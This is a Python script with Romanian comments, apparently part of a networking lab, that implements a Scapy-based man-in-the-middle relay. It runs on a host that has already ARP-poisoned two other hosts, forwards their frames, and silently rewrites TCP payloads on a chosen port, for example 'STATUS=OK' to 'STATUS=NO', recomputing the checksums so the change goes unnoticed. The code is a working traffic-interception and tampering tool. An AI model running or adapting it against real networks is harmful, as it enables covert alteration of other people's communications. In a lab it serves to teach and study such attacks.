#!/usr/bin/env python3
"""
scapy_relay.py - Relay Layer 2 in user space + rescrierea payload-ului.

Dupa otravire, cadrele dintre h1 si h2 ajung la h3 (adresate Ethernet catre
MAC_h3). ip_forward este DEZACTIVAT in h3, deci kernelul NU retransmite; Scapy
este singurul mecanism care releaza traficul.

Relay-ul:
  * captureaza numai cadre IP cu Ethernet dst = MAC_h3 (filtru BPF);
  * retransmite toate segmentele (SYN, SYN-ACK, ACK, FIN, RST, date);
  * modifica DOAR direcția h2->h1, DOAR TCP cu dport configurat, DOAR daca
    payload-ul contine exact secventa configurata;
  * pastreaza lungimea (STATUS=OK -> STATUS=NO); sterge IP.len/chksum/TCP.chksum
    ca sa fie regenerate.
"""
from __future__ import annotations

import argparse
import os
import sys
import threading
from typing import Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lab_config import load_lab

from scapy.all import Ether, IP, TCP, Raw, sniff, sendp, conf  # noqa: E402
from attacks.payload_transform import transform_payload  # noqa: E402,F401


class ScapyRelay:
    def __init__(self, iface, h1_ip, h1_mac, h2_ip, h2_mac, h3_mac,
                 server_port, original, modified, logger=print):
        self.iface = iface
        self.h1_ip, self.h1_mac = h1_ip, h1_mac
        self.h2_ip, self.h2_mac = h2_ip, h2_mac
        self.h3_mac = h3_mac
        self.server_port = server_port
        self.original = original
        self.modified = modified
        self.log = logger
        self.stats = {"relayed": 0, "modified": 0}
        self._stop_event = None

    def transform(self, payload: bytes) -> Tuple[bytes, bool]:
        return transform_payload(payload, self.original, self.modified)

    def relay(self, frame):
        if IP not in frame:
            return
        ip = frame[IP]

        if ip.src == self.h2_ip and ip.dst == self.h1_ip:
            out_mac = self.h1_mac
            self._maybe_rewrite(frame)
        elif ip.src == self.h1_ip and ip.dst == self.h2_ip:
            out_mac = self.h2_mac
        else:
            return

        # NU pastram MAC-ul original ca Ether.src (altfel switch-ul ar invata
        # gresit ca MAC_h1/MAC_h2 sunt pe portul lui h3).
        frame[Ether].src = self.h3_mac
        frame[Ether].dst = out_mac
        sendp(frame, iface=self.iface, verbose=False)
        self.stats["relayed"] += 1

    def _maybe_rewrite(self, frame):
        if TCP not in frame or Raw not in frame:
            return
        if frame[TCP].dport != self.server_port:
            return
        data = bytes(frame[Raw].load)
        new_data, changed = self.transform(data)
        if changed:
            frame[Raw].load = new_data
            # fortam regenerarea campurilor dependente la serializare
            del frame[IP].len
            del frame[IP].chksum
            del frame[TCP].chksum
            self.stats["modified"] += 1
            self.log(f"[relay] payload modificat: {data!r} -> {new_data!r}")

    def start(self, stop_event: threading.Event):
        self._stop_event = stop_event
        bpf = f"ether dst {self.h3_mac} and ip"
        self.log(f"[relay] pornit pe {self.iface} (filtru: '{bpf}')")
        t = threading.Thread(
            target=lambda: sniff(iface=self.iface, filter=bpf, store=False,
                                 prn=self.relay,
                                 stop_filter=lambda p: stop_event.is_set()),
            daemon=True)
        t.start()
        return t


def main():
    lab = load_lab()
    h1, h2, h3 = lab.host("h1"), lab.host("h2"), lab.host("h3")
    ap = argparse.ArgumentParser(description="Relay L2 MITM (laborator SDN)")
    ap.add_argument("--iface", default="h3-eth0")
    ap.add_argument("--duration", type=float, required=True)
    args = ap.parse_args()

    if os.geteuid() != 0:
        sys.exit("[EROARE] Ruleaza ca root.")
    conf.verb = 0

    relay = ScapyRelay(
        args.iface, h1.ip, h1.mac, h2.ip, h2.mac, h3.mac,
        server_port=int(lab.arp.get("server_port", 9000)),
        original=lab.arp.get("original_payload", "STATUS=OK\n").encode(),
        modified=lab.arp.get("modified_payload", "STATUS=NO\n").encode())
    stop = threading.Event()
    relay.start(stop)
    import time
    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        print(f"[relay] statistici: {relay.stats}")


if __name__ == "__main__":
    main()